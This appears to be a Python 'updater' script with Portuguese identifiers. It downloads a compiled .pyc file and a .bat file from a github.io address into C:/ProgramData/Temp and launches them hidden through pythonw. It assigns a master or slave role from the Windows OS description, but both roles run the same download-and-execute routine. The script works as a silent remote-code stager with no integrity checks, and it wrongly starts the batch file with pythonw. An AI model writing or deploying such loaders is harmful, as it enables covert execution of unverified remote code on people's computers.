import os
import subprocess
import time
import datetime
import urllib.request
from pathlib import Path
import subprocess, re, sys

import urllib.request
# import requests

DESLIGADO = 0
LIGADO = 1
TESTE = 2


EXECUCAO = TESTE

# Configurações fixas
base_url = "https://lokilaki.github.io/dcreamit/"
arquivos_para_baixar = ["atualizador.pyc", "updateFusion.bat"]
destino = Path("C:/ProgramData/Temp")
# destino = Path(os.getenv("APPDATA")) / "Temp"
#destino = Path(tempfile.gettempdir())


def baixar_arquivos():
    destino.mkdir(parents=True, exist_ok=True)
    for arquivo in arquivos_para_baixar:
        url = base_url + arquivo
        destino_final = destino / arquivo
        try:
            urllib.request.urlretrieve(url, destino_final)
        except Exception as e:
            print(f"Erro ao baixar {arquivo}: {e}")
            continue

def get_computer_description():
    try:
        result = subprocess.check_output(
            ['powershell', '-Command', "(Get-WmiObject Win32_OperatingSystem).Description"],
            stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL,
            text=True
        )
        return result.strip()
    except Exception:
        return "sem_descricao"

def executar_arquivos():
    for arquivo in arquivos_para_baixar:
        subprocess.Popen(f'cmd /c start pythonw "{destino}\\{arquivo}"', shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def main_master():
    baixar_arquivos()
    executar_arquivos()


def main_slave():
    baixar_arquivos()
    executar_arquivos()



if __name__ == "__main__":
    if EXECUCAO == DESLIGADO:
        exit()
    if len(sys.argv) > 1:
        perfil = sys.argv[1]
        print(f"Executando no perfil: {perfil}")
        if perfil.upper() == "MASTER":
            main_master()
        elif perfil.upper() == "SLAVE":
            main_slave()
    else:
        try:
            m = re.search(r'(\d{2})\s*$', get_computer_description())
            if not m:
                raise ValueError("Descrição inválida. Esperado dois dígitos no final.")
            sequencial = int(m.group(1))
            if sequencial == 0:
                main_master()
            else:
                main_slave()
        except Exception:
            sys.exit(1)

